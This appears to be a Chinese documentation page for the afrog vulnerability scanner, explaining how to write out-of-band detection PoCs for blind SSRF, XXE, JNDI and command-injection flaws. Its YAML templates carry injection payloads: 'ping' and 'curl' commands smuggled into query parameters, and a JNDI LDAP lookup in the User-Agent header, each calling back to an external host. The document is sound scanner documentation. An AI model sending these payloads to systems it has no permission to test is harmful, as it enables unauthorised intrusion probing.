---
title: OOB 带外检测
slug: /docs/poc/oob
lang: zh
summary: 介绍 afrog OOB PoC 的推荐写法、证据输出和常见排障思路。
status: published
source: docs/afrog-poc-guide.md, docs/tutorial/rumen-dao-rutu/05-poc-advanced.md, afrog.wiki/OOB 体系大升级：新版写法与证据教程（v3.3.9）.md
last_reviewed: 2026-09-16
---

OOB（Out-of-Band）适用于那些“打到了但不会在 HTTP 响应里回显”的漏洞，例如 SSRF、XXE、JNDI、无回显命令执行等。

## OOB 是什么

思路很简单：

1. 让目标去访问我们控制的域名或 URL
2. 去 OOB 平台查询有没有收到这次访问记录

收到记录，说明目标确实触发了对应链路。

## 新版推荐写法

当前推荐主流程是：

- `{{oob.DNS}}` / `{{oob.HTTP}}`
- `oobCheck(protocol, timeout)`

最小 DNS 示例：

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

## 常用模板

### DNS 外带

```yaml
id: demo-oob-dns

info:
  name: Demo OOB DNS
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

### HTTP 外带

```yaml
id: demo-oob-http

info:
  name: Demo OOB HTTP
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?http=curl%20{{oob.HTTP}}
    expression: oobCheck("http", 3)

expression: r0()
```

### JNDI 观测

```yaml
id: demo-oob-jndi

info:
  name: Demo OOB JNDI
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck("dns", 5)

expression: r0()
```

## timeout 怎么选

经验上：

- HTTP OOB：通常 `3` 秒
- DNS OOB：通常 `5` 秒

如果你怀疑触发链路是异步任务，可以再逐步提高到 `8` 到 `15` 秒。

## 证据在哪里看

命中后，结果里会附带 `oob_evidence` 这类证据摘要。你通常可以在以下位置看到：

- 终端输出
- HTML 报告
- 其它消费结构化结果的页面或系统

如果你需要在表达式或输出中取证据，也可以使用：

```yaml
oobEvidence()
```

## 旧写法与新写法

旧写法常见形式：

```yaml
set:
  oob: oob()

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
```

新版推荐写法更短，也更统一：

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)
```

## 常见失败原因

如果 OOB 没命中，优先排查：

1. 目标根本不出网
2. 平台配置错误
3. timeout 太短
4. payload 没真正触发
5. 旧语法或旧思路与当前版本不匹配

## 配置提醒

OOB 平台本身需要先在配置文件里准备好。常见平台包括：

- ceye
- dnslog.cn
- alphalog
- xray
- revsuit

配置入口见：

- [配置文件说明](../user-guide/configuration.md)

## 相关文档

- [PoC 编写快速开始](./quickstart.md)
- [PoC 语法参考](./syntax.md)
